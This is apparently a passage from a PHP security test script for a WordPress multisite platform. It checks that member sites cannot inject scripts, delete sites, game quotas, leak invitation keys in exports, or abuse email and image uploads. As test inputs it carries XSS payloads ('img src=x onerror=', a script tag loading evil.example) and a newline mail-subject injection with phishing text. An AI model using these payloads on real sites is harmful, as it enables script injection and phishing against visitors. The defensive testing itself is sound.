		$view = $http( 'GET', $host, (string) wp_parse_url( $url, PHP_URL_PATH ) . ( wp_parse_url( $url, PHP_URL_QUERY ) ? '?' . wp_parse_url( $url, PHP_URL_QUERY ) : '' ) );
		$check( 'an anonymous visitor to the page with the signed instance gets no script', 200 === $view['code'] && str_contains( $view['body'], 'front page text' ) && ! str_contains( $view['body'], 'spectra-block-js' ) && ! str_contains( $view['body'], '__isolation_probe' ), $view['code'] . ', ' . strlen( $view['body'] ) . ' bytes' );
	}
	// The same through every other way a member could save the markup that carries it: a reusable block and a template part.
	$out = $rest_json( 'POST', $host, '/wp/v2/blocks', array( 'title' => 'Isolation pattern', 'status' => 'publish', 'content' => $js_block ), $member, $cookies );
	$bid = (int) ( $out['json']['id'] ?? 0 );
	$made['posts'][ $site ][] = $bid;
	switch_to_blog( $site );
	$stored = (string) get_post_field( 'post_content', $bid );
	restore_current_blog();
	$check( 'a member saves a reusable block with it: not stored', $bid > 0 && ! str_contains( $stored, 'spectraCustomJS' ), $out['code'] . ' ' . substr( $stored, 0, 60 ) );

	// The container's htmlTag, saved by a member and viewed by a visitor.
	$tag_page = '<!-- wp:spectra/container {"htmlTag":"img src=x onerror=window.__isolation_tag=1"} --><!-- wp:paragraph --><p>tag page text</p><!-- /wp:paragraph --><!-- /wp:spectra/container -->';
	$out      = $rest_json( 'POST', $host, '/wp/v2/pages', array( 'title' => 'Isolation tag', 'status' => 'publish', 'content' => $tag_page ), $member, $cookies );
	$tid      = (int) ( $out['json']['id'] ?? 0 );
	$made['posts'][ $site ][] = $tid;
	$link_url = (string) ( $out['json']['link'] ?? '' );
	$view     = $http( 'GET', $host, (string) wp_parse_url( $link_url, PHP_URL_PATH ) . ( wp_parse_url( $link_url, PHP_URL_QUERY ) ? '?' . wp_parse_url( $link_url, PHP_URL_QUERY ) : '' ) );
	$handlers = array();
	$tags     = new WP_HTML_Tag_Processor( $view['body'] );
	while ( $tags->next_tag() ) {
		foreach ( (array) $tags->get_attribute_names_with_prefix( 'on' ) as $attribute ) {
			$handlers[] = $tags->get_tag() . ' ' . $attribute;
		}
	}
	$check( 'a member saves a container whose htmlTag is "img src=x onerror=...": the visitor gets no event handler', 201 === $out['code'] && 200 === $view['code'] && str_contains( $view['body'], 'tag page text' ) && ! $handlers, implode( ', ', $handlers ) . ' (' . $view['code'] . ')' );

	// The accordion title's tagName, the way the review used it: a member saves the page over REST, a visitor opens it.
	$view_of = static function ( string $url ) use ( $http, $host ): array {
		return $http( 'GET', $host, (string) wp_parse_url( $url, PHP_URL_PATH ) . ( wp_parse_url( $url, PHP_URL_QUERY ) ? '?' . wp_parse_url( $url, PHP_URL_QUERY ) : '' ) );
	};
	$scripts_in = static function ( string $html ): array {
		$found = array();
		$p     = new WP_HTML_Tag_Processor( $html );
		while ( $p->next_tag( 'SCRIPT' ) ) {
			$src = $p->get_attribute( 'src' );
			if ( is_string( $src ) && str_contains( $src, 'evil.example' ) ) {
				$found[] = $src;
			}
		}
		return $found;
	};
	$acc_page = '<!-- wp:paragraph --><p>accordion page text</p><!-- /wp:paragraph --><!-- wp:spectra/accordion --><!-- wp:spectra/accordion-child-item --><!-- wp:spectra/accordion-child-header {"headerElement":"div"} --><!-- wp:spectra/accordion-child-header-content {"tagName":"script src=https://evil.example/x.js","text":"Hi"} /--><!-- /wp:spectra/accordion-child-header --><!-- /wp:spectra/accordion-child-item --><!-- /wp:spectra/accordion -->';
	$out      = $rest_json( 'POST', $host, '/wp/v2/pages', array( 'title' => 'Isolation accordion', 'status' => 'publish', 'content' => $acc_page ), $member, $cookies );
	$aid      = (int) ( $out['json']['id'] ?? 0 );
	$made['posts'][ $site ][] = $aid;
	switch_to_blog( $site );
	$stored = (string) get_post_field( 'post_content', $aid );
	restore_current_blog();
	$view = $view_of( (string) ( $out['json']['link'] ?? '' ) );
	$check( 'a member saves the accordion with tagName "script src=...": not stored, and the visitor gets no script', 201 === $out['code'] && '' !== $stored && ! str_contains( $stored, 'evil.example' ) && str_contains( $stored, 'accordion-child-header' ) && 200 === $view['code'] && str_contains( $view['body'], 'accordion page text' ) && ! $scripts_in( $view['body'] ), $out['code'] . ' ' . substr( $stored, 0, 100 ) . ' | script tags: ' . count( $scripts_in( $view['body'] ) ) );
	// Already stored (by the server, as before this check existed): the render alone holds.
	switch_to_blog( $site );
	$old_id = (int) wp_insert_post(
		array(
			'post_type'    => 'page',
			'post_status'  => 'publish',
			'post_title'   => 'Isolation accordion stored',
			'post_content' => $acc_page,
			'post_author'  => $member,
		)
	);
	$old_stored = (string) get_post_field( 'post_content', $old_id );
	$old_url    = (string) get_permalink( $old_id );
	restore_current_blog();
	$made['posts'][ $site ][] = $old_id;
	$view = $view_of( $old_url );
	$check( 'control: the server may store it as it is', str_contains( $old_stored, 'evil.example' ) );
	$check( 'content stored that way is safe on the public page too: no script', 200 === $view['code'] && str_contains( $view['body'], 'accordion page text' ) && ! $scripts_in( $view['body'] ) && str_contains( $view['body'], 'Hi' ), $view['code'] . ', script tags: ' . count( $scripts_in( $view['body'] ) ) );
	// A pattern and a template part carry blocks too: the save clamps them and the render does as well.
	$out = $rest_json( 'POST', $host, '/wp/v2/blocks', array( 'title' => 'Isolation accordion pattern', 'status' => 'publish', 'content' => $acc_page ), $member, $cookies );
	$bid = (int) ( $out['json']['id'] ?? 0 );
	$made['posts'][ $site ][] = $bid;
	switch_to_blog( $site );
	$stored = (string) get_post_field( 'post_content', $bid );
	restore_current_blog();
	$check( 'a member saves it in a reusable block: not stored', $bid > 0 && ! str_contains( $stored, 'evil.example' ), $out['code'] . ' ' . substr( $stored, 0, 60 ) );

	// The widget routes over HTTP, as the original attack used them.
	$out = $http(
		'POST',
		$host,
		'/wp-json/wp/v2/widget-types/block/encode',
		$cookies,
		array(
			'Content-Type' => 'application/x-www-form-urlencoded',
			'X-WP-Nonce'   => $nonce( $member, $cookies, 'wp_rest' ),
		),
		'form_data=' . rawurlencode( 'widget-block[1][content]=' . rawurlencode( $js_block ) )
	);
	$check( 'a member\'s widget-types/block/encode request is refused', 403 === $out['code'] && ! str_contains( $out['body'], 'encoded' ), $out['code'] . ' ' . substr( $out['body'], 0, 80 ) );
}

// 2. Application Passwords ------------------------------------------------------------------------------

echo "\nApplication Passwords\n";
if ( $on_member ) {
	$out = $http( 'GET', $host, '/wp-admin/authorize-application.php?app_name=Probe&success_url=' . rawurlencode( 'https://' . $host . '/done' ), $admin_c );
	$to  = (string) wp_parse_url( $out['location'], PHP_URL_HOST ) . (string) wp_parse_url( $out['location'], PHP_URL_PATH );
	$check( 'on a member host the authorize screen goes to the main site, with the request', 302 === $out['code'] && $host_of( $main ) . '/wp-admin/authorize-application.php' === $to && str_contains( $out['location'], 'app_name=Probe' ), $out['code'] . ' ' . $out['location'] );
	$out = $http( 'GET', $host_of( $main ), '/wp-admin/authorize-application.php?app_name=Probe&success_url=' . rawurlencode( 'https://' . $host_of( $main ) . '/done' ), $admin_c );
	$check( '... on the main site it opens, for a super admin', 200 === $out['code'], (string) $out['code'] );
}

// 3. Deleting a site ------------------------------------------------------------------------------------

echo "\nDeleting a site\n";
if ( $on_member ) {
	$check( 'a member administrator may not delete_site', ! user_can_for_site( $member, $site, 'delete_site' ) && in_array( 'delete_site', MemberSite::BLOCKED_CAPS, true ) );
	$check( '... a super admin may', user_can_for_site( $super, $site, 'delete_site' ) );
	$out = $http( 'GET', $host, '/wp-admin/ms-delete-site.php', $cookies );
	$check( 'the Delete Site screen says so kindly (403)', 403 === $out['code'] && str_contains( $out['body'], 'download your whole site first' ), $out['code'] );
	$out = $http( 'GET', $host, '/wp-admin/ms-delete-site.php?h=whatever', $cookies );
	$check( '... and no hash link deletes anything', 403 === $out['code'] && ! get_site( $site )->deleted );
	$out = $http( 'GET', $host, '/wp-admin/tools.php', $cookies );
	$check( 'Tools has no Delete Site entry', 200 === $out['code'] && ! str_contains( $out['body'], 'ms-delete-site.php' ), (string) $out['code'] );
}

// 4. The quota counts owned sites -----------------------------------------------------------------------

echo "\nQuota\n";
$owner = $new_user( 'modyown' );
$other = $new_user( 'modyoth' );
$slug  = 'modyiso' . $suffix;
wp_set_current_user( $super );
$job_id = Pipeline::start(
	$owner,
	array(
		'slug'    => $slug,
		'title'   => 'Isolation test',
		'starter' => true,
	)
);
$check( 'a site is queued for the owner', is_int( $job_id ), is_wp_error( $job_id ) ? $job_id->get_error_message() : '' );
if ( is_int( $job_id ) ) {
	$made['jobs'][] = $job_id;
	Pipeline::run( $job_id );
	$row     = ProvisioningJobs::get( $job_id );
	$site_a  = (int) ( $row['site_id'] ?? 0 );
	$made['sites'][] = $site_a;
	$check( 'the pipeline made it, and recorded its owner', $site_a > 0 && $owner === (int) get_site_meta( $site_a, Quota::OWNER_META, true ), 'site ' . $site_a );
	$check( '... the owner uses one site of the plan', 1 === Quota::used( $owner ), (string) Quota::used( $owner ) );

	// The attack: a second account takes the administrator role, and the owner is demoted.
	add_user_to_blog( $site_a, $other, 'administrator' );
	$demote = new WP_User( $owner, '', $site_a );
	switch_to_blog( $site_a );
	$demote->set_role( 'editor' );
	restore_current_blog();
	clean_user_cache( $owner );
	wp_cache_set_sites_last_changed();
	$check( 'the owner is demoted to editor, and the second account is administrator', ! user_can_for_site( $owner, $site_a, 'manage_options' ) && user_can_for_site( $other, $site_a, 'manage_options' ) );
	$check( '... the site still counts for its owner', 1 === Quota::used( $owner ), (string) Quota::used( $owner ) );
	$check( '... and not for the account that holds the administrator role', 0 === Quota::used( $other ), (string) Quota::used( $other ) );
	$check( '... the owner cannot open another site with the same plan slot', true === Quota::can_create_site( $owner ) && 3 === Quota::limit( $owner ) );
	$count = 0;
	foreach ( array_keys( get_blogs_of_user( $other ) ) as $blog ) {
		$count += is_main_site( (int) $blog ) ? 0 : 1;
	}
	$check( '... the second account is a member of the site all the same', 1 === $count );

	// Sites made by another route (the Network Admin) are owned by the user they are made for.
	$installing = wp_installing(); // wpmu_create_blog() turns it on and leaves it on.
	$site_b     = (int) wpmu_create_blog( 'modyiso2' . $suffix . '.' . preg_replace( '/^www\./', '', get_network()->domain ), '/', 'Isolation legacy', $other );
	wp_installing( $installing );
	$made['sites'][] = $site_b;
	$check( 'a site made with wpmu_create_blog() is owned by its first user', $other === (int) get_site_meta( $site_b, Quota::OWNER_META, true ) && $other === Quota::owner( $site_b ) );
	$check( '... and counts for that user', 1 === Quota::used( $other ) );

	// Older sites: no recorded owner.
	$bump = static function (): void {
		wp_cache_set_sites_last_changed();
	};
	delete_site_meta( $site_b, Quota::OWNER_META );
	$bump();
	$check( 'an older site (no owner) still counts, for the administrator who has a role on it', 1 === Quota::used( $other ) && $other === (int) get_site_meta( $site_b, Quota::OWNER_META, true ) );
	delete_site_meta( $site_b, Quota::OWNER_META );
	$bump();
	$legacy_job = ProvisioningJobs::create( $owner, array( 'slug' => 'x', 'title' => 'x' ) );
	$made['jobs'][] = $legacy_job;
	update_blog_option( $site_b, 'mody_provisioning_job', $legacy_job );
	$check( 'owner() of an older site is the user of the job that made it, before any administrator', $owner === Quota::owner( $site_b ) && $owner === (int) get_site_meta( $site_b, Quota::OWNER_META, true ) );
	delete_site_meta( $site_b, Quota::OWNER_META );
	delete_blog_option( $site_b, 'mody_provisioning_job' );
	$bump();
	$check( '... with no job, the first administrator', $other === Quota::owner( $site_b ) );
	$check( 'the main site has no owner', 0 === Quota::owner( $main ) );

	// The one-time fill-in.
	delete_site_meta( $site_b, Quota::OWNER_META );
	$flag = get_site_option( Quota::BACKFILL_OPTION );
	delete_site_option( Quota::BACKFILL_OPTION );
	$bump();
	Quota::backfill();
	$check( 'backfill() records the owner of every site without one, once', $other === (int) get_site_meta( $site_b, Quota::OWNER_META, true ) && (bool) get_site_option( Quota::BACKFILL_OPTION ) );
	$unowned = get_sites(
		array(
			'site__not_in' => array( $main ),
			'fields'       => 'ids',
			'number'       => '',
			'meta_query'   => array( array( 'key' => Quota::OWNER_META, 'compare' => 'NOT EXISTS' ) ), // phpcs:ignore WordPress.DB.SlowDBQuery
		)
	);
	$check( '... no site is left without one that can have one', ! $unowned || ! array_filter( $unowned, static fn( $id ) => Quota::owner( (int) $id ) > 0 ), count( $unowned ) . ' without' );
	if ( false === $flag ) {
		delete_site_option( Quota::BACKFILL_OPTION ); // As it was: the next admin page does the real one.
	}

	// A deleted or archived site does not count.
	update_blog_status( $site_b, 'deleted', 1 );
	$bump();
	$check( 'a deleted site does not count', 0 === Quota::used( $other ) );
	update_blog_status( $site_b, 'deleted', 0 );
	update_blog_status( $site_b, 'archived', 1 );
	$bump();
	$check( '... nor an archived one', 0 === Quota::used( $other ) );
	update_blog_status( $site_b, 'archived', 0 );
	$bump();
	$check( '... and it counts again once restored', 1 === Quota::used( $other ) );

	// 5. The database export ------------------------------------------------------------------------------

	echo "\nDatabase export\n";
	$key = 'IsoKey' . strtoupper( wp_generate_password( 14, false ) );
	switch_to_blog( $site_a );
	add_option( 'new_user_' . $key, array( 'user_id' => $stranger, 'email' => 'victim@example.org', 'role' => 'administrator' ) );
	add_option( 'delete_blog_hash', 'DELETEHASHVALUE' );
	add_option( 'new_user_sentinel_not_a_key', 'x' );
	$dir = '/tmp/mody-iso-test-' . $suffix;
	wp_mkdir_p( $dir );
	$dump     = $dir . '/database.sql.gz';
	$manifest = Exporter::manifest(
		array(
			'site_id'    => $site_a,
			'user_id'    => $owner,
			'token'      => bin2hex( random_bytes( 16 ) ),
			'created_at' => gmdate( 'Y-m-d H:i:s' ),
		)
	);
	$result = DatabaseDump::write( $site_a, $owner, $dump, $manifest, static function (): void {} );
	restore_current_blog();
	$made['files'][] = $dump;
	$made['files'][] = $dir; // After the file: the folder is removed when it is empty.
	$text            = '';
	if ( true === $result && is_file( $dump ) ) {
		$gz = gzopen( $dump, 'rb' );
		while ( $gz && ! gzeof( $gz ) ) {
			$text .= (string) gzgets( $gz, 4194304 );
		}
		$gz && gzclose( $gz );
	}
	$check( 'a dump of a site with a pending invitation is written', true === $result && '' !== $text, is_wp_error( $result ) ? $result->get_error_message() : size_format( strlen( $text ) ) );
	$check( 'the invitation (its key, the user, the role) is not in it', ! str_contains( $text, $key ) && ! str_contains( $text, 'new_user_' ) && ! str_contains( $text, 'victim@example.org' ) );
	$check( '... nor the site\'s delete hash', ! str_contains( $text, 'DELETEHASHVALUE' ) && ! str_contains( $text, 'delete_blog_hash' ) );
	$check( '... while the site\'s other options still travel', str_contains( $text, "'admin_email'" ) && str_contains( $text, "'blogname'" ) );
	$pattern = ( new ReflectionClassConstant( DatabaseDump::class, 'OPTION_DROP_PATTERN' ) )->getValue();
	$check( 'the pattern drops new_user_ options and no other core option', 1 === preg_match( $pattern, 'new_user_' . $key ) && 0 === preg_match( $pattern, 'new_admin_email' ) && 0 === preg_match( $pattern, 'blogname' ) );

	// 6. The export cooldown ---------------------------------------------------------------------------------

	echo "\nExport cooldown\n";
	$stubbed = ! class_exists( 'Mody\Platform\Export\Runner', false );
	if ( $stubbed ) {
		eval( 'namespace Mody\Platform\Export; final class Runner { public static int $watched = 0; public static function start( int $job_id ): void {} public static function watch(): void { ++self::$watched; } }' ); // phpcs:ignore Squiz.PHP.Eval.Discouraged -- Test stub: the real one starts real builds.
	}
	ExportJobs::install();
	$wpdb->delete( ExportJobs::table(), array( 'site_id' => $site_a ) ); // phpcs:ignore WordPress.DB.DirectDatabaseQuery
	$mails = array();
	$first = ExportPanel::start( $site_a, $owner );
	$count = static fn(): int => (int) $wpdb->get_var( $wpdb->prepare( 'SELECT COUNT(*) FROM ' . ExportJobs::table() . ' WHERE site_id = %d', $site_a ) ); // phpcs:ignore WordPress.DB
	$check( 'the first copy starts', 'started' === $first && 1 === $count(), $first );
	$job = (array) ExportJobs::current( $site_a );
	$wpdb->update( ExportJobs::table(), array( 'status' => 'done', 'step' => 'done', 'finished_at' => gmdate( 'Y-m-d H:i:s' ) ), array( 'id' => $job['id'] ) ); // phpcs:ignore WordPress.DB.DirectDatabaseQuery
	$mails = array();
	$again = ExportPanel::start( $site_a, $owner );
	$check( 'a fresh copy right after a finished one: cooldown, no new job, no email', 'cooldown' === $again && 1 === $count() && array() === $mails, $again );
	$wpdb->update( ExportJobs::table(), array( 'status' => 'running' ), array( 'id' => $job['id'] ) ); // phpcs:ignore WordPress.DB.DirectDatabaseQuery
	$check( '... one still running is busy, not a cooldown', 'busy' === ExportPanel::start( $site_a, $owner ) && 1 === $count() );
	$wpdb->update( ExportJobs::table(), array( 'status' => 'failed' ), array( 'id' => $job['id'] ) ); // phpcs:ignore WordPress.DB.DirectDatabaseQuery
	$_GET['export-result'] = 'cooldown';
	switch_to_blog( $site_a );
	ob_start();
	( new ReflectionMethod( ExportPanel::class, 'render_notice' ) )->invoke( null, 'failed' );
	$notice = ob_get_clean();
	restore_current_blog();
	unset( $_GET['export-result'] );
	$check( '... a failed one has no files: its notice does not say "the files above"', ! str_contains( $notice, 'files above' ) && str_contains( $notice, 'You can prepare a fresh copy now' ), wp_strip_all_tags( $notice ) );
	$mails = array();
	$retry = ExportPanel::start( $site_a, $owner );
	$check( '... and Try again after a failure starts at once, no cooldown', 'started' === $retry && 2 === $count(), $retry );
	$check( '... the per-site lock is released', 1 === (int) $wpdb->get_var( $wpdb->prepare( 'SELECT IS_FREE_LOCK( %s )', 'mody_export_panel_' . $site_a ) ) ); // phpcs:ignore WordPress.DB
	$job = (array) ExportJobs::current( $site_a );
	$wpdb->update( ExportJobs::table(), array( 'status' => 'done', 'step' => 'done', 'finished_at' => gmdate( 'Y-m-d H:i:s' ) ), array( 'id' => $job['id'] ) ); // phpcs:ignore WordPress.DB.DirectDatabaseQuery
	$check( '... then the cooldown holds again, counted from that finished copy', 'cooldown' === ExportPanel::start( $site_a, $owner ) && 2 === $count() );
	$_GET['export-result'] = 'cooldown';
	switch_to_blog( $site_a );
	ob_start();
	( new ReflectionMethod( ExportPanel::class, 'render_notice' ) )->invoke( null, 'done' );
	$notice = ob_get_clean();
	restore_current_blog();
	unset( $_GET['export-result'] );
	$check( 'the notice says kindly when the next one is possible', str_contains( $notice, 'files above are the latest' ) && str_contains( $notice, 'you can prepare a fresh copy from' ) && str_contains( $notice, 'minutes)' ), wp_strip_all_tags( $notice ) );
	$wpdb->update( ExportJobs::table(), array( 'created_at' => gmdate( 'Y-m-d H:i:s', time() - ExportPanel::COOLDOWN - 60 ) ), array( 'id' => $job['id'] ) ); // phpcs:ignore WordPress.DB.DirectDatabaseQuery
	$check( 'once the cooldown has passed, a new copy starts', 'started' === ExportPanel::start( $site_a, $owner ) && 3 === $count() );
	$job2 = (array) ExportJobs::current( $site_a );
	$wpdb->update( ExportJobs::table(), array( 'status' => 'done', 'step' => 'done' ), array( 'id' => $job2['id'] ) ); // phpcs:ignore WordPress.DB.DirectDatabaseQuery
	$check( 'a super admin helping a member is not held back', 'started' === ExportPanel::start( $site_a, $super ) && 4 === $count() );
	$job3 = (array) ExportJobs::current( $site_a );
	$wpdb->update( ExportJobs::table(), array( 'status' => 'done', 'step' => 'done' ), array( 'id' => $job3['id'] ) ); // phpcs:ignore WordPress.DB.DirectDatabaseQuery
	add_filter( 'mody_export_cooldown', '__return_zero' );
	$check( 'the cooldown can be set to 0 (filter mody_export_cooldown)', 'started' === ExportPanel::start( $site_a, $owner ) && 5 === $count() );
	remove_filter( 'mody_export_cooldown', '__return_zero' );
	$wpdb->delete( ExportJobs::table(), array( 'site_id' => $site_a ) ); // phpcs:ignore WordPress.DB.DirectDatabaseQuery
	if ( ! $stubbed ) {
		echo "note: the real Runner was loaded: its watch() may have started a real build.\n";
	}
}

// 7. The administration email ----------------------------------------------------------------------------

echo "\nAdministration email\n";
if ( $on_member ) {
	Throttle::reset( 'admin_email' );
	$title_before = get_option( 'blogname' );
	$email_before = get_option( 'admin_email' );
	update_option( 'blogname', 'Win a prize' . "\n" . 'Subject: Your bank account is locked, click here now ' . str_repeat( 'x', 100 ) );
	wp_set_current_user( $member );
	$mails = array();
	foreach ( array( 'one', 'two', 'three', 'four', 'five' ) as $word ) {
		update_option( 'new_admin_email', $word . $suffix . '@example.org' );
	}
	$sent = array_values( array_filter( $mails, static fn( $m ) => str_contains( implode( ',', (array) $m['to'] ), '@example.org' ) ) );
	$check( 'a member site may ask for three administration email changes a day', 3 === count( $sent ), count( $sent ) . ' emails to ' . implode( ', ', array_map( static fn( $m ) => implode( ',', (array) $m['to'] ), $sent ) ) );
	$check( '... the fourth and fifth change nothing', 'three' . $suffix . '@example.org' === get_option( 'new_admin_email' ), (string) get_option( 'new_admin_email' ) );
	$errors = wp_list_pluck( get_settings_errors( 'general' ), 'code' );
	$check( '... and the settings page says why', in_array( 'mody_admin_email_limit', $errors, true ), implode( ',', $errors ) );
	$subject = (string) ( $sent[0]['subject'] ?? '' );
	$body    = (string) ( $sent[0]['message'] ?? '' );
	$check( 'the subject has the site title shortened, on one line', 1 === preg_match( '/^\[Win a prize Subject: Your bank [^\]]*\] New Admin Email Address$/u', $subject ) && ! str_contains( $subject, "\n" ) && mb_strlen( $subject ) < 100, $subject );
	$check( '... and so has the text', ! str_contains( $body, str_repeat( 'x', 20 ) ) && str_contains( $body, 'All at Win a prize' ), '' );
	wp_set_current_user( $super );
	$mails = array();
	update_option( 'new_admin_email', 'six' . $suffix . '@example.org' );
	$check( 'a super admin is not limited', 'six' . $suffix . '@example.org' === get_option( 'new_admin_email' ) );
	delete_option( 'new_admin_email' );
	delete_option( 'adminhash' );
	update_option( 'blogname', $title_before );
	update_option( 'admin_email', $email_before );
	Throttle::reset( 'admin_email' );
	wp_set_current_user( 0 );
	$check( 'short_title() caps and cleans', 40 >= mb_strwidth( MemberMail::short_title() ) && ! preg_match( '/[\r\n]/', MemberMail::short_title() ) );
}
$check( 'Throttle: allows the limit, then refuses, then says when', ( static function () {
	Throttle::reset( 'iso_unit' );
	$ok = Throttle::hit( 'iso_unit', 2, 3600 ) && Throttle::hit( 'iso_unit', 2, 3600 ) && ! Throttle::hit( 'iso_unit', 2, 3600 );
	$ok = $ok && Throttle::wait( 'iso_unit', 2, 3600 ) > 3500 && 0 === Throttle::wait( 'iso_unit', 3, 3600 );
	Throttle::reset( 'iso_unit' );
	return $ok && 0 === Throttle::wait( 'iso_unit', 2, 3600 );
} )() );

// 8. Invitations ---------------------------------------------------------------------------------------------

echo "\nInvitations\n";
if ( $on_member ) {
	Throttle::reset( 'invitations' );
	$invite = static function ( string $email ) use ( $http, $host, $cookies, $nonce, $member ): array {
		return $http(
			'POST',
			$host,
			'/wp-admin/user-new.php',
			$cookies,
			array(),
			array(
				'action'            => 'adduser',
				'email'             => $email,
				'role'              => 'editor',
				'_wpnonce_add-user' => $nonce( $member, $cookies, 'add-user' ),
				'_wp_http_referer'  => '/wp-admin/user-new.php',
			)
		);
	};
	$pending = static function () use ( $site ): array {
		switch_to_blog( $site );
		global $wpdb;
		$rows = (array) $wpdb->get_col( "SELECT option_name FROM {$wpdb->options} WHERE option_name LIKE 'new\\_user\\_%'" ); // phpcs:ignore WordPress.DB
		restore_current_blog();
		return $rows;
	};
	$before = $pending();
	$known  = $invite( get_userdata( $stranger )->user_email );
	$after1 = $pending();
	$ghost  = $invite( 'nobody' . $suffix . '@example.org' );
	$after2 = $pending();
	$loc    = static fn( array $out ): string => (string) wp_parse_url( $out['location'], PHP_URL_QUERY );
	$check( 'inviting a registered account: redirected with update=add, and an invitation is stored', 302 === $known['code'] && 'update=add' === $loc( $known ) && count( $after1 ) === count( $before ) + 1, $known['code'] . ' ' . $known['location'] );
	$check( '... an address with no account: the very same answer', 302 === $ghost['code'] && $loc( $known ) === $loc( $ghost ) && $known['location'] === $ghost['location'], $ghost['code'] . ' ' . $ghost['location'] );
	$check( '... and nothing is stored for it', count( $after2 ) === count( $after1 ) );
	$page = $http( 'GET', $host, '/wp-admin/user-new.php?update=add', $cookies );
	$check( 'the message is true for both: "If that address has an account"', 200 === $page['code'] && str_contains( $page['body'], 'If that address has an account' ) && ! str_contains( $page['body'], 'Invitation email sent to user' ), (string) $page['code'] );
	$page = $http( 'GET', $host, '/wp-admin/user-new.php?update=does_not_exist', $cookies );
	$check( 'a plain visit still works', 200 === ( $http( 'GET', $host, '/wp-admin/user-new.php', $cookies )['code'] ) && 200 === $page['code'] );

	// The daily limit: the counter is filled by real requests (nothing is sent for an address with no account).
	$last = array( 'code' => 0, 'body' => '' );
	$sent = 0;
	for ( $i = 0; $i < MemberMail::INVITATION_LIMIT + 3 && 429 !== $last['code']; $i++ ) {
		$last = $invite( 'bulk' . $i . $suffix . '@example.org' );
		++$sent;
	}
	$check( 'after ' . MemberMail::INVITATION_LIMIT . ' in a day: refused (429) with a kind message', 429 === $last['code'] && str_contains( $last['body'], 'most a site can send in a day' ), $last['code'] . ' after ' . $sent . ' more (2 already counted)' );
	$check( '... the limit was reached after exactly ' . MemberMail::INVITATION_LIMIT . ' attempts, wherever they went', MemberMail::INVITATION_LIMIT - 2 + 1 === $sent, (string) $sent );
	$over_known = $invite( get_userdata( $stranger )->user_email );
	$check( '... a registered account and any other address alike', 429 === $over_known['code'] && count( $pending() ) === count( $after2 ), (string) $over_known['code'] );
	switch_to_blog( $site );
	Throttle::reset( 'invitations' );
	foreach ( array_diff( $pending(), $before ) as $option ) {
		delete_option( $option ); // Only the ones this test made.
	}
	restore_current_blog();
	// The email: a short site title.
	$title_before = get_option( 'blogname' );
	update_option( 'blogname', 'Offer' . "\n" . 'Dear customer: ' . str_repeat( 'y', 90 ) );
	$email = MemberMail::invitation_email(
		array(
			'to'      => 'a@example.org',
			'subject' => '[long] Joining Confirmation',
			'message' => "You've been invited to join '" . get_option( 'blogname' ) . "' at https://x/",
			'headers' => '',
		)
	);
	update_option( 'blogname', $title_before );
	$check( 'the invitation email has the site title shortened, on one line', ! str_contains( $email['subject'], "\n" ) && mb_strlen( $email['subject'] ) < 100 && ! str_contains( $email['message'], str_repeat( 'y', 20 ) ), $email['subject'] );
}

// 9. Pictures ----------------------------------------------------------------------------------------------------

echo "\nPictures\n";
// A PNG with a real header and no pixels: enough for the size check, nothing to decode.
$png = static function ( int $width, int $height ): string {
	$chunk = static fn( string $type, string $data ): string => pack( 'N', strlen( $data ) ) . $type . $data . pack( 'N', crc32( $type . $data ) );
	return "\x89PNG\r\n\x1a\n" . $chunk( 'IHDR', pack( 'NNCCCCC', $width, $height, 8, 0, 0, 0, 0 ) ) . $chunk( 'IDAT', (string) gzcompress( "\0" ) ) . $chunk( 'IEND', '' );
};
$file_of = static function ( int $width, int $height ) use ( $png, &$made, $suffix ): string {
	$path = '/tmp/mody-iso-' . $suffix . '-' . $width . 'x' . $height . '.png';
	file_put_contents( $path, $png( $width, $height ) ); // phpcs:ignore WordPress.WP.AlternativeFunctions.file_system_operations_file_put_contents
	$made['files'][] = $path;
	return $path;
};
$bomb  = $file_of( 12000, 12000 );
$wide  = $file_of( 30000, 100 );
$phone = $file_of( 8064, 6048 );
$logo  = $file_of( 1200, 1200 );
$check( 'too_big(): 12000x12000 is over a profile picture\'s side', ImageLimits::too_big( $bomb, ImageLimits::PROFILE_MAX_SIDE ) );
$check( '... 1200x1200 is not, and a file that is not a picture is not judged', ! ImageLimits::too_big( $logo, ImageLimits::PROFILE_MAX_SIDE ) && ! ImageLimits::too_big( __FILE__, ImageLimits::PROFILE_MAX_SIDE ) && ! ImageLimits::too_big( '/nonexistent', 10 ) );
$check( '... 0 pixels is too small', ImageLimits::too_big( $file_of( 0, 5 ), 6000 ) );
$avatar = Avatars::store( $member, array( 'name' => 'me.png', 'tmp_name' => $bomb, 'size' => filesize( $bomb ), 'error' => 0 ) );
$check( 'a 12000x12000 profile picture is refused before anything decodes it', is_wp_error( $avatar ) && 'mody_avatar_dimensions' === $avatar->get_error_code(), is_wp_error( $avatar ) ? $avatar->get_error_message() : 'attachment ' . $avatar );
$store_logo = new ReflectionMethod( WizardController::class, 'store_logo' );
$logo_out   = $store_logo->invoke( null, array( 'name' => 'logo.png', 'tmp_name' => $bomb, 'size' => filesize( $bomb ), 'error' => 0 ) );
$check( 'a 12000x12000 wizard logo is refused, with a kind message', is_wp_error( $logo_out ) && str_contains( $logo_out->get_error_message(), 'too large' ), is_wp_error( $logo_out ) ? $logo_out->get_error_message() : 'attachment' );

wp_set_current_user( $member );
$upload = static fn( string $path ): array => ImageLimits::prefilter( array( 'name' => basename( $path ), 'tmp_name' => $path, 'type' => 'image/png', 'size' => filesize( $path ), 'error' => 0 ) );
$check( 'the upload filter refuses 144 megapixels, for a member', ! empty( $upload( $bomb )['error'] ) && str_contains( (string) $upload( $bomb )['error'], 'too large' ), (string) $upload( $bomb )['error'] );
$check( '... and a picture 30000 pixels wide', ! empty( $upload( $wide )['error'] ) );
$check( '... but not a 48 megapixel phone photo, nor a logo', empty( $upload( $phone )['error'] ) && empty( $upload( $logo )['error'] ) );
wp_set_current_user( $super );
$check( '... a super admin is not limited', empty( $upload( $bomb )['error'] ) );
wp_set_current_user( 0 );
$check( 'the filters are hooked for uploads and sideloads, and Imagick gets limits', false !== has_filter( 'wp_handle_upload_prefilter', array( ImageLimits::class, 'prefilter' ) ) && false !== has_filter( 'wp_handle_sideload_prefilter', array( ImageLimits::class, 'prefilter' ) ) && false !== has_filter( 'wp_image_editors', array( ImageLimits::class, 'limit_imagick' ) ) );
if ( class_exists( Imagick::class ) ) {
	apply_filters( 'wp_image_editors', array( 'WP_Image_Editor_Imagick', 'WP_Image_Editor_GD' ) );
	$limit = static fn( int $type ): int => (int) Imagick::getResourceLimit( $type );
